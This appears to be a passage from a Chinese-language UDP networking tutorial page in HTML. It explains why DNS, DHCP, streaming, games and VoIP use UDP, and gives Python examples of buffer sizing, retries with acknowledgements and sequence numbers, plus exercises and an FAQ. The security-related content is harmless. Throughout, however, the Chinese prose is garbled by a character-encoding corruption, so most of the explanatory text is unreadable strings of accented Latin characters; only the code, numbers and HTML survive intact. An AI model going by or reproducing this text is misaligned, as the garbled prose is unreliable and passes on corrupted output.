å‡å°‘å»¶è¿Ÿ<br><br><span class="hljs-bullet">4.</span> è¶…æ—¶é‡è¯•ç®€å•<br><span class="hljs-bullet">   -</span> åº”ç”¨å±‚è‡ªå·±æ§åˆ¶<br><br>æ³¨æ„ï¼š<br><span class="hljs-bullet">-</span> å“åº” &gt; 512å­—èŠ‚æ—¶ä¼šä½¿ç”¨TCP<br><span class="hljs-bullet">-</span> DNSSECå¯èƒ½éœ€è¦æ›´å¤§çš„åŒ…<br></code></pre></td></tr></table></figure><h3 id="6-2-DHCP"><a href="#6-2-DHCP" class="headerlink" title="6.2 DHCP"></a>6.2 DHCP</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä¸ºä»€ä¹ˆDHCPä½¿ç”¨UDPï¼Ÿ<br><br><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯è¿˜æ²¡æœ‰IPåœ°å€<br><span class="hljs-bullet">   -</span> æ— æ³•å»ºç«‹TCPè¿æ¥<br><span class="hljs-bullet">   -</span> UDPå¯ä»¥ä½¿ç”¨å¹¿æ’­<br><br><span class="hljs-bullet">2.</span> ç®€å•çš„è¯·æ±‚-å“åº”<br><span class="hljs-bullet">   -</span> 4ä¸ªåŒ…ï¼ˆDORAï¼‰å®Œæˆ<br><span class="hljs-bullet">   -</span> ä¸éœ€è¦å¤æ‚çš„è¿æ¥ç®¡ç†<br><br><span class="hljs-bullet">3.</span> å…è®¸å¹¿æ’­<br><span class="hljs-bullet">   -</span> å®¢æˆ·ç«¯å¹¿æ’­Discover<br><span class="hljs-bullet">   -</span> UDPæ”¯æŒå¹¿æ’­<br></code></pre></td></tr></table></figure><h3 id="6-3-æµåª’ä½“"><a href="#6-3-æµåª’ä½“" class="headerlink" title="6.3 æµåª’ä½“"></a>6.3 æµåª’ä½“</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä¸ºä»€ä¹ˆæµåª’ä½“ä½¿ç”¨UDPï¼Ÿ<br><br><span class="hljs-bullet">1.</span> å®æ—¶æ€§ä¼˜å…ˆ<br><span class="hljs-bullet">   -</span> å®å¯è·³å¸§ä¹Ÿä¸è¦å»¶è¿Ÿ<br><span class="hljs-bullet">   -</span> TCPé‡ä¼ ä¼šå¢åŠ å»¶è¿Ÿ<br><br><span class="hljs-bullet">2.</span> å¯ä»¥å®¹å¿ä¸¢åŒ…<br><span class="hljs-bullet">   -</span> è§†é¢‘ä¸¢å‡ å¸§å½±å“ä¸å¤§<br><span class="hljs-bullet">   -</span> éŸ³é¢‘å¯ä»¥æ’å€¼è¡¥å¿<br><br><span class="hljs-bullet">3.</span> ååé‡é«˜<br><span class="hljs-bullet">   -</span> æ— æ‹¥å¡æ§åˆ¶<br><span class="hljs-bullet">   -</span> å¯ä»¥å¿«é€Ÿä¼ è¾“<br><br>åè®®ç¤ºä¾‹ï¼š<br><span class="hljs-bullet">-</span> RTPï¼ˆå®æ—¶ä¼ è¾“åè®®ï¼‰<br><span class="hljs-bullet">-</span> RTCPï¼ˆRTPæ§åˆ¶åè®®ï¼‰<br><span class="hljs-bullet">-</span> RTSPï¼ˆå®æ—¶æµåè®®ï¼‰<br></code></pre></td></tr></table></figure><h3 id="6-4-ç½‘ç»œæ¸¸æˆ"><a href="#6-4-ç½‘ç»œæ¸¸æˆ" class="headerlink" title="6.4 ç½‘ç»œæ¸¸æˆ"></a>6.4 ç½‘ç»œæ¸¸æˆ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä¸ºä»€ä¹ˆç½‘ç»œæ¸¸æˆä½¿ç”¨UDPï¼Ÿ<br><br><span class="hljs-bullet">1.</span> å»¶è¿Ÿæ•æ„Ÿ<br><span class="hljs-bullet">   -</span> éœ€è¦å¿«é€Ÿå“åº”<br><span class="hljs-bullet">   -</span> TCPé‡ä¼ ä¼šå¡é¡¿<br><br><span class="hljs-bullet">2.</span> çŠ¶æ€æ›´æ–°é¢‘ç¹<br><span class="hljs-bullet">   -</span> æ¯å¸§æ›´æ–°ä½ç½®<br><span class="hljs-bullet">   -</span> æ—§æ•°æ®æ²¡ç”¨äº†<br><br><span class="hljs-bullet">3.</span> è‡ªå®šä¹‰å¯é æ€§<br><span class="hljs-bullet">   -</span> é‡è¦æ•°æ®ï¼ˆæ”»å‡»ï¼‰éœ€è¦å¯é ä¼ è¾“<br><span class="hljs-bullet">   -</span> ä¸é‡è¦æ•°æ®ï¼ˆä½ç½®ï¼‰å¯ä»¥ä¸¢å¤±<br><br>å®ç°æ–¹å¼ï¼š<br><span class="hljs-bullet">-</span> ä½ç½®æ›´æ–°ï¼šUDPï¼ˆå¯ä»¥ä¸¢ï¼‰<br><span class="hljs-bullet">-</span> æ”»å‡»æŒ‡ä»¤ï¼šUDP + åº”ç”¨å±‚ç¡®è®¤ï¼ˆå¯é ï¼‰<br><span class="hljs-bullet">-</span> èŠå¤©æ¶ˆæ¯ï¼šå¯ä»¥ç”¨TCP<br></code></pre></td></tr></table></figure><h3 id="6-5-VoIPï¼ˆç½‘ç»œç”µè¯ï¼‰"><a href="#6-5-VoIPï¼ˆç½‘ç»œç”µè¯ï¼‰" class="headerlink" title="6.5 VoIPï¼ˆç½‘ç»œç”µè¯ï¼‰"></a>6.5 VoIPï¼ˆç½‘ç»œç”µè¯ï¼‰</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä¸ºä»€ä¹ˆVoIPä½¿ç”¨UDPï¼Ÿ<br><br><span class="hljs-bullet">1.</span> å®æ—¶æ€§è¦æ±‚æé«˜<br><span class="hljs-bullet">   -</span> å»¶è¿Ÿ &gt; 150ms ä¼šæ„Ÿè§‰åˆ°å¡é¡¿<br><span class="hljs-bullet">   -</span> TCPé‡ä¼ å»¶è¿Ÿå¤ªå¤§<br><br><span class="hljs-bullet">2.</span> å¯ä»¥å®¹å¿å°‘é‡ä¸¢åŒ…<br><span class="hljs-bullet">   -</span> ä¸¢å¤±å‡ ä¸ªéŸ³é¢‘å¸§å½±å“ä¸å¤§<br><span class="hljs-bullet">   -</span> äººè€³å¯ä»¥è¡¥å¿<br><br><span class="hljs-bullet">3.</span> å¸¦å®½ç¨³å®š<br><span class="hljs-bullet">   -</span> è¯­éŸ³ç¼–ç é€Ÿç‡å›ºå®š<br><span class="hljs-bullet">   -</span> ä¸éœ€è¦TCPçš„æ‹¥å¡æ§åˆ¶<br><br>åè®®ï¼š<br><span class="hljs-bullet">-</span> SIPï¼ˆä¼šè¯åˆå§‹åè®®ï¼‰<br><span class="hljs-bullet">-</span> RTP/RTCP<br></code></pre></td></tr></table></figure><hr><h2 id="7-UDPç¼–ç¨‹é™·é˜±"><a href="#7-UDPç¼–ç¨‹é™·é˜±" class="headerlink" title="7. UDPç¼–ç¨‹é™·é˜±"></a>7. UDPç¼–ç¨‹é™·é˜±</h2><h3 id="7-1-ç¼“å†²åŒºæº¢å‡º"><a href="#7-1-ç¼“å†²åŒºæº¢å‡º" class="headerlink" title="7.1 ç¼“å†²åŒºæº¢å‡º"></a>7.1 ç¼“å†²åŒºæº¢å‡º</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">é—®é¢˜ï¼š<br>æ¥æ”¶ç¼“å†²åŒºå¤ªå°ï¼Œæ•°æ®è¢«æˆªæ–­<br><br>é”™è¯¯ç¤ºä¾‹ï¼š<br>data, addr = sock.recvfrom(<span class="hljs-number">100</span>)  <span class="hljs-comment"># åªæ¥æ”¶100å­—èŠ‚</span><br><span class="hljs-comment"># å¦‚æœæ•°æ® &gt; 100å­—èŠ‚ï¼Œä¼šè¢«æˆªæ–­ï¼</span><br><br>æ­£ç¡®åšæ³•ï¼š<br><span class="hljs-comment"># ä½¿ç”¨è¶³å¤Ÿå¤§çš„ç¼“å†²åŒº</span><br>data, addr = sock.recvfrom(<span class="hljs-number">65536</span>)  <span class="hljs-comment"># UDPæœ€å¤§åŒ…å¤§å°</span><br><br><span class="hljs-comment"># æˆ–è€…ä½¿ç”¨MSG_TRUNCæ ‡å¿—æ£€æµ‹æˆªæ–­</span><br>data, addr = sock.recvfrom(<span class="hljs-number">100</span>, socket.MSG_TRUNC)<br></code></pre></td></tr></table></figure><h3 id="7-2-æ•°æ®æŠ¥ä¸¢å¤±"><a href="#7-2-æ•°æ®æŠ¥ä¸¢å¤±" class="headerlink" title="7.2 æ•°æ®æŠ¥ä¸¢å¤±"></a>7.2 æ•°æ®æŠ¥ä¸¢å¤±</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">é—®é¢˜ï¼š<br>UDPä¸ä¿è¯å¯é ä¼ è¾“<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-number">1.</span> åº”ç”¨å±‚æ·»åŠ è¶…æ—¶é‡ä¼ <br><span class="hljs-number">2.</span> ä½¿ç”¨åºåˆ—å·æ£€æµ‹ä¸¢åŒ…<br><span class="hljs-number">3.</span> é‡è¦æ•°æ®è¦æ±‚ç¡®è®¤<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_with_ack</span>(<span class="hljs-params">sock, data, addr, timeout=<span class="hljs-number">3</span>, retries=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(retries):<br>        sock.sendto(data, addr)<br>        sock.settimeout(timeout)<br>        <span class="hljs-keyword">try</span>:<br>            ack, _ = sock.recvfrom(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># æ”¶åˆ°ç¡®è®¤</span><br>        <span class="hljs-keyword">except</span> socket.timeout:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¶…æ—¶ï¼Œé‡è¯• <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>/<span class="hljs-subst">&#123;retries&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># å¤±è´¥</span><br></code></pre></td></tr></table></figure><h3 id="7-3-æ•°æ®æŠ¥ä¹±åº"><a href="#7-3-æ•°æ®æŠ¥ä¹±åº" class="headerlink" title="7.3 æ•°æ®æŠ¥ä¹±åº"></a>7.3 æ•°æ®æŠ¥ä¹±åº</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">é—®é¢˜ï¼š<br>æ•°æ®åŒ…å¯èƒ½ä¸æŒ‰é¡ºåºåˆ°è¾¾<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>æ·»åŠ åºåˆ—å·å¹¶é‡æ’åº<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_packet</span>(<span class="hljs-params">sock, seq, data, addr</span>):<br>    <span class="hljs-comment"># æ·»åŠ åºåˆ—å·</span><br>    packet = struct.pack(<span class="hljs-string">&#x27;!I&#x27;</span>, seq) + data<br>    sock.sendto(packet, addr)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv_packet</span>(<span class="hljs-params">sock</span>):<br>    packet, addr = sock.recvfrom(<span class="hljs-number">1024</span>)<br>    seq = struct.unpack(<span class="hljs-string">&#x27;!I&#x27;</span>, packet[:<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>    data = packet[<span class="hljs-number">4</span>:]<br>    <span class="hljs-keyword">return</span> seq, data, addr<br></code></pre></td></tr></table></figure><h3 id="7-4-è¿æ¥è·Ÿè¸ª"><a href="#7-4-è¿æ¥è·Ÿè¸ª" class="headerlink" title="7.4 è¿æ¥è·Ÿè¸ª"></a>7.4 è¿æ¥è·Ÿè¸ª</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">é—®é¢˜ï¼š<br>UDPæ— çŠ¶æ€ï¼Œéš¾ä»¥è·Ÿè¸ª<span class="hljs-string">&quot;è¿æ¥&quot;</span><br><br>è§£å†³æ–¹æ¡ˆï¼š<br>åº”ç”¨å±‚ç»´æŠ¤ä¼šè¯è¡¨<br><br>ç¤ºä¾‹ï¼š<br>sessions = &#123;&#125;  <span class="hljs-comment"># &#123;client_addr: session_data&#125;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data, addr = sock.recvfrom(<span class="hljs-number">1024</span>)<br><br>    <span class="hljs-keyword">if</span> addr <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sessions:<br>        <span class="hljs-comment"># æ–°å®¢æˆ·ç«¯</span><br>        sessions[addr] = &#123;<br>            <span class="hljs-string">&#x27;created&#x27;</span>: time.time(),<br>            <span class="hljs-string">&#x27;last_activity&#x27;</span>: time.time()<br>        &#125;<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># æ›´æ–°æ´»åŠ¨æ—¶é—´</span><br>        sessions[addr][<span class="hljs-string">&#x27;last_activity&#x27;</span>] = time.time()<br><br>    <span class="hljs-comment"># æ¸…ç†è¶…æ—¶ä¼šè¯</span><br>    cleanup_timeout_sessions(sessions)<br></code></pre></td></tr></table></figure><hr><h2 id="8-å®æˆ˜é¡¹ç›®ï¼šUDPåº”ç”¨é›†åˆ"><a href="#8-å®æˆ˜é¡¹ç›®ï¼šUDPåº”ç”¨é›†åˆ" class="headerlink" title="8. å®æˆ˜é¡¹ç›®ï¼šUDPåº”ç”¨é›†åˆ"></a>8. å®æˆ˜é¡¹ç›®ï¼šUDPåº”ç”¨é›†åˆ</h2><h3 id="8-1-é¡¹ç›®åŠŸèƒ½"><a href="#8-1-é¡¹ç›®åŠŸèƒ½" class="headerlink" title="8.1 é¡¹ç›®åŠŸèƒ½"></a>8.1 é¡¹ç›®åŠŸèƒ½</h3><p>å®ç°å¤šä¸ªåŸºäºUDPçš„åº”ç”¨ï¼š</p><ol><li>UDPå›æ˜¾æœåŠ¡å™¨</li><li>UDPèŠå¤©å®¤</li><li>UDPæ–‡ä»¶ä¼ è¾“ï¼ˆå¸¦å¯é æ€§ï¼‰</li><li>UDPç½‘ç»œå‘ç°</li></ol><h3 id="8-2-å·¥å…·æ¼”ç¤º"><a href="#8-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="8.2 å·¥å…·æ¼”ç¤º"></a>8.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># UDPå›æ˜¾æœåŠ¡å™¨</span><br>python day17_udp_demo.py --echo-server 9999<br><br><span class="hljs-comment"># UDPå›æ˜¾å®¢æˆ·ç«¯</span><br>python day17_udp_demo.py --echo-client 127.0.0.1 9999<br><br><span class="hljs-comment"># UDPèŠå¤©å®¤æœåŠ¡å™¨</span><br>python day17_udp_demo.py --chat-server 9998<br><br><span class="hljs-comment"># UDPèŠå¤©å®¤å®¢æˆ·ç«¯</span><br>python day17_udp_demo.py --chat-client 127.0.0.1 9998<br><br><span class="hljs-comment"># å¯é UDPæ–‡ä»¶ä¼ è¾“</span><br>python day17_udp_demo.py --reliable-send file.txt 127.0.0.1 9997<br></code></pre></td></tr></table></figure><hr><h2 id="9-ä»Šæ—¥ç»ƒä¹ "><a href="#9-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="9. ä»Šæ—¥ç»ƒä¹ "></a>9. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šä½¿ç”¨Wiresharkåˆ†æUDP"><a href="#ç»ƒä¹ 1ï¼šä½¿ç”¨Wiresharkåˆ†æUDP" class="headerlink" title="ç»ƒä¹ 1ï¼šä½¿ç”¨Wiresharkåˆ†æUDP"></a>ç»ƒä¹ 1ï¼šä½¿ç”¨Wiresharkåˆ†æUDP</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> å¯åŠ¨Wireshark<br><span class="hljs-bullet">2.</span> è¿‡æ»¤UDPï¼šudp<br><span class="hljs-bullet">3.</span> è®¿é—®ä¸€ä¸ªç½‘ç«™ï¼ˆè§¦å‘DNSæŸ¥è¯¢ï¼‰<br><span class="hljs-bullet">4.</span> è§‚å¯ŸDNSæŸ¥è¯¢å’Œå“åº”<br><span class="hljs-bullet">5.</span> åˆ†æUDPå¤´éƒ¨å­—æ®µ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šç¼–å†™UDP-ping"><a href="#ç»ƒä¹ 2ï¼šç¼–å†™UDP-ping" class="headerlink" title="ç»ƒä¹ 2ï¼šç¼–å†™UDP ping"></a>ç»ƒä¹ 2ï¼šç¼–å†™UDP ping</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®ç°ç±»ä¼¼ICMP pingçš„åŠŸèƒ½ï¼Œä½†ä½¿ç”¨UDP</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼š</span><br><span class="hljs-comment"># 1. å‘é€UDPåŒ…åˆ°ç›®æ ‡</span><br><span class="hljs-comment"># 2. æµ‹é‡å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰</span><br><span class="hljs-comment"># 3. ç»Ÿè®¡ä¸¢åŒ…ç‡</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šUDP-vs-TCPæ€§èƒ½æµ‹è¯•"><a href="#ç»ƒä¹ 3ï¼šUDP-vs-TCPæ€§èƒ½æµ‹è¯•" class="headerlink" title="ç»ƒä¹ 3ï¼šUDP vs TCPæ€§èƒ½æµ‹è¯•"></a>ç»ƒä¹ 3ï¼šUDP vs TCPæ€§èƒ½æµ‹è¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># åˆ†åˆ«ä½¿ç”¨TCPå’ŒUDPä¼ è¾“ç›¸åŒæ•°æ®</span><br><span class="hljs-comment"># æ¯”è¾ƒï¼š</span><br><span class="hljs-comment"># 1. ä¼ è¾“æ—¶é—´</span><br><span class="hljs-comment"># 2. CPUä½¿ç”¨ç‡</span><br><span class="hljs-comment"># 3. ç½‘ç»œå¸¦å®½ä½¿ç”¨</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šå®ç°ç®€å•çš„å¯é UDP"><a href="#ç»ƒä¹ 4ï¼šå®ç°ç®€å•çš„å¯é UDP" class="headerlink" title="ç»ƒä¹ 4ï¼šå®ç°ç®€å•çš„å¯é UDP"></a>ç»ƒä¹ 4ï¼šå®ç°ç®€å•çš„å¯é UDP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®ç°åŸºæœ¬çš„å¯é ä¼ è¾“æœºåˆ¶ï¼š</span><br><span class="hljs-comment"># 1. åºåˆ—å·</span><br><span class="hljs-comment"># 2. ACKç¡®è®¤</span><br><span class="hljs-comment"># 3. è¶…æ—¶é‡ä¼ </span><br><span class="hljs-comment"># 4. æµ‹è¯•ä¸¢åŒ…åœºæ™¯</span><br></code></pre></td></tr></table></figure><hr><h2 id="10-å¸¸è§é—®é¢˜"><a href="#10-å¸¸è§é—®é¢˜" class="headerlink" title="10. å¸¸è§é—®é¢˜"></a>10. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šUDPçœŸçš„æ¯”TCPå¿«å—ï¼Ÿå¿«å¤šå°‘ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>é¦–æ¬¡é€šä¿¡ï¼šUDPå¿«çº¦4.5å€ï¼ˆçœå»ä¸‰æ¬¡æ¡æ‰‹ï¼‰</li><li>ç¨³å®šä¼ è¾“ï¼šUDPå¯ä»¥æ›´å¿«ï¼ˆæ— æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶ï¼‰</li><li>ä½†å®é™…æ€§èƒ½å–å†³äºç½‘ç»œçŠ¶å†µå’Œåº”ç”¨éœ€æ±‚</li></ul><p><strong>Q2ï¼šä¸ºä»€ä¹ˆä¸éƒ½ç”¨UDPï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å¤§å¤šæ•°åº”ç”¨éœ€è¦å¯é ä¼ è¾“</li><li>åœ¨åº”ç”¨å±‚å®ç°å¯é æ€§å¾ˆå¤æ‚</li><li>UDPéœ€è¦å¤„ç†ä¸¢åŒ…ã€ä¹±åºã€é‡å¤</li><li>TCPå·²ç»å¾ˆæˆç†Ÿï¼Œä¸ºä»€ä¹ˆè¦é‡æ–°å‘æ˜è½®å­ï¼Ÿ</li></ul><p><strong>Q3ï¼šUDPçš„æ ¡éªŒå’Œæ˜¯å¿…é¡»çš„å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>IPv4ä¸­æ˜¯å¯é€‰çš„ï¼ˆå¯ä»¥è®¾ä¸º0ï¼‰</li><li>IPv6ä¸­æ˜¯å¿…é¡»çš„</li><li>å¼ºçƒˆå»ºè®®ä½¿ç”¨ï¼šæ£€æµ‹ä¼ è¾“é”™è¯¯</li></ul><p><strong>Q4ï¼šUDPå¯ä»¥å»ºç«‹â€è¿æ¥â€å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>UDPæœ¬èº«æ˜¯æ— è¿æ¥çš„</li><li>ä½†å¯ä»¥ä½¿ç”¨connect()ç³»ç»Ÿè°ƒç”¨</li><li>æ•ˆæœï¼šç»‘å®šåˆ°ç‰¹å®šçš„å¯¹ç«¯åœ°å€</li><li>å¥½å¤„ï¼šåªèƒ½ä¸è¯¥åœ°å€é€šä¿¡ï¼Œè¿‡æ»¤å…¶ä»–æ¥æº</li></ul><p><strong>Q5ï¼šUDPæœ€å¤§èƒ½ä¼ è¾“å¤šå°‘æ•°æ®ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ç†è®ºæœ€å¤§ï¼š65535 - 8 &#x3D; 65527å­—èŠ‚</li><li>å®é™…é™åˆ¶ï¼šMTUï¼ˆé€šå¸¸1500å­—èŠ‚ï¼‰</li><li>è¶…è¿‡MTUä¼šè¢«IPå±‚åˆ†ç‰‡</li><li>å»ºè®®ï¼šä¿æŒåœ¨1472å­—èŠ‚ä»¥å†…ï¼ˆé¿å…åˆ†ç‰‡ï¼‰</li></ul><hr><h2 id="11-æ€»ç»“"><a href="#11-æ€»ç»“" class="headerlink" title="11. æ€»ç»“"></a>11. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>UDPç‰¹ç‚¹</strong>ï¼š</p><ul><li>æ— è¿æ¥ã€ä¸å¯é ã€å¿«é€Ÿã€å¼€é”€å°</li><li>é€‚åˆå®æ—¶åº”ç”¨å’Œç®€å•è¯·æ±‚</li></ul></li><li><p><strong>UDPæŠ¥æ–‡æ ¼å¼</strong>ï¼š</p><ul><li>å¤´éƒ¨åªæœ‰8å­—èŠ‚</li><li>4ä¸ªå­—æ®µï¼šæºç«¯å£ã€ç›®æ ‡ç«¯å£ã€é•¿åº¦ã€æ ¡éªŒå’Œ</li></ul></li><li><p><strong>UDP vs TCP</strong>ï¼š</p><ul><li>å»¶è¿Ÿï¼šUDPä½</li><li>å¯é æ€§ï¼šTCPé«˜</li><li>å¤æ‚åº¦ï¼šUDPç®€å•</li></ul></li><li><p><strong>UDPåº”ç”¨</strong>ï¼š</p><ul><li>DNSã€DHCPã€æµåª’ä½“ã€æ¸¸æˆã€VoIP</li></ul></li><li><p><strong>å¯é UDP</strong>ï¼š</p><ul><li>åœ¨åº”ç”¨å±‚å®ç°å¯é æ€§</li><li>KCPã€QUICç­‰åè®®</li></ul></li><li><p><strong>UDPç¼–ç¨‹</strong>ï¼š</p><ul><li>sendto()&#x2F;recvfrom()</li><li>æ”¯æŒå¹¿æ’­å’Œç»„æ’­</li><li>ä¿ç•™æ¶ˆæ¯è¾¹ç•Œ</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">UDP</span> = ç®€å• + å¿«é€Ÿ + çµæ´»<br><br>é€‚ç”¨åœºæ™¯ï¼š<br>âœ… å®æ—¶æ€§ &gt; å¯é æ€§<br>âœ… å¯ä»¥å®¹å¿å°‘é‡ä¸¢åŒ…<br>âœ… ç®€å•è¯·æ±‚-å“åº”<br>âœ… å¹¿æ’­/ç»„æ’­<br><br>ä¸é€‚ç”¨åœºæ™¯ï¼š<br>âŒ éœ€è¦å¯é ä¼ è¾“<br>âŒ å¤§é‡æ•°æ®ä¼ è¾“<br>âŒ ä¸èƒ½ä¸¢å¤±ä»»ä½•æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" 